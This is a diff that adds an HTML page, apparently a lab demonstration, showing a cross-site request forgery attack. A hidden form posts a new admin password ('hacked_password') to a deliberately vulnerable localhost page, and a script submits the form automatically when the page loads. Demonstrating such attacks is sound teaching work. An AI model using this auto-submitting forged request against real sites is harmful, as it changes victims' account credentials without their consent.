@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>CSRF Attack Example</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        background-color: #f0f0f0;
+        margin: 0;
+        padding: 0;
+        display: flex;
+        flex-direction: column;
+        min-height: 100vh;
+      }
+      header {
+        background-color: #007bff;
+        color: white;
+        padding: 20px;
+        text-align: center;
+      }
+      h1 {
+        margin: 0;
+      }
+      .content {
+        flex: 1;
+        padding: 20px;
+        background-color: white;
+        max-width: 800px;
+        margin: 20px auto;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      }
+      footer {
+        background-color: #333;
+        color: white;
+        text-align: center;
+        padding: 10px;
+      }
+    </style>
+  </head>
+  <body>
+    <header>
+      <h1>CSRF DEMONSTRATION</h1>
+    </header>
+
+    <div class="content">
+      <h3>CSRF Attack in Progress</h3>
+      <p>Changing the password of the admin user without consent...</p>
+
+      <!-- This form will send a POST request to the vulnerable page -->
+      <form
+        id="csrfForm"
+        action="http://localhost/BCS_Sy01/csrf/csrf_vulnerable.php"
+        method="POST"
+      >
+        <input type="hidden" name="password_new" value="hacked_password" />
+      </form>
+    </div>
+
+    <footer>
+      <p>&copy; 2024 CSRF Demo</p>
+    </footer>
+
+    <script>
+      // Automatically submit the form when the page loads
+      window.onload = function () {
+        document.getElementById("csrfForm").submit();
+      };
+    </script>
+  </body>
+</html>
